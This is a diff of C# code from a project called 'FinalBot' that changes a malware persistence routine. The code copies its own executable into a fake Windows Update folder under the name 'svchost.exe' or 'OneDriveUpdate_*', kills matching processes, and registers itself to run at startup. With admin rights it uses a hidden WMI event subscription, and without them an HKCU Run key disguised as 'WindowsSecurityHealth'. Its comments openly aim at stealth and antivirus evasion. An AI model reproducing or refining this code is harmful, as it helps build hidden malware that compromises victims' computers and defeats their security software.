@@ -16,10 +16,10 @@ namespace FinalBot
                 string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                 if (string.IsNullOrEmpty(selfPath)) return;
 
-                // Use LocalAppData as it is often less restricted than Roaming/Protect
+                // Target directory: blends in with real Windows Update files
                 string localData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                 string targetDir = Path.Combine(localData, "Microsoft", "Windows", "UpdateService");
-                string targetPath = Path.Combine(targetDir, "svchost.exe"); // Named svchost for stealth
+                string targetPath = Path.Combine(targetDir, "svchost.exe");
 
                 if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
 
@@ -27,18 +27,13 @@ namespace FinalBot
                 {
                     try
                     {
-                        // Try to kill existing process if it prevents overwrite
                         foreach (var p in Process.GetProcessesByName("svchost"))
                         {
-                            try 
-                            { 
-                                // Only kill if it's OUR svchost (checking path)
-                                if (p.MainModule?.FileName.ToLower() == targetPath.ToLower())
-                                {
-                                    p.Kill(); 
-                                    p.WaitForExit(1000); 
-                                }
-                            } 
+                            try
+                            {
+                                if (p.Id != Process.GetCurrentProcess().Id)
+                                    try { if (p.MainModule?.FileName.ToLower() == targetPath.ToLower()) { p.Kill(); p.WaitForExit(1000); } } catch { }
+                            }
                             catch { }
                         }
                         File.Copy(selfPath, targetPath, true);
@@ -46,17 +41,28 @@ namespace FinalBot
                     }
                     catch (Exception ex)
                     {
-                        Logger.Warn($"[PERSISTENCE] Initial copy failed: {ex.Message}. Trying random name.");
-                        targetPath = Path.Combine(targetDir, $"svc_{Guid.NewGuid().ToString().Substring(0,8)}.exe");
+                        Logger.Warn($"[PERSISTENCE] Initial copy failed: {ex.Message}. Using alternative name.");
+                        targetPath = Path.Combine(targetDir, $"OneDriveUpdate_{Guid.NewGuid().ToString().Substring(0, 8)}.exe");
                         File.Copy(selfPath, targetPath, true);
                     }
                 }
 
-                // ONLY WMI Event Subscription (invisible, survives registry scans)
-                // Removed Registry Run Key and SchTasks as they cause static AV detections
-                InstallWMI(targetPath);
+                Logger.Info("[PERSISTENCE] File copy phase complete.");
 
-                Logger.Info("[PERSISTENCE] WMI stealth method installed.");
+                // SURGICAL PERSISTENCE: pick the stealthiest single method per privilege level
+                bool isAdmin = VanguardCore.ElevationService.IsAdmin();
+                if (isAdmin)
+                {
+                    // Admin: WMI event subscription — completely hidden from registry, schtasks, and startup folders
+                    InstallWMI(targetPath);
+                    Logger.Info("[PERSISTENCE] WMI stealth method installed.");
+                }
+                else
+                {
+                    // User: single HKCU Run key — low noise, no visible UAC prompt required
+                    PersistManager.InstallRegistryRun("WindowsSecurityHealth", targetPath, false);
+                    Logger.Info("[PERSISTENCE] HKCU Run key installed.");
+                }
             }
             catch (Exception ex)
             {
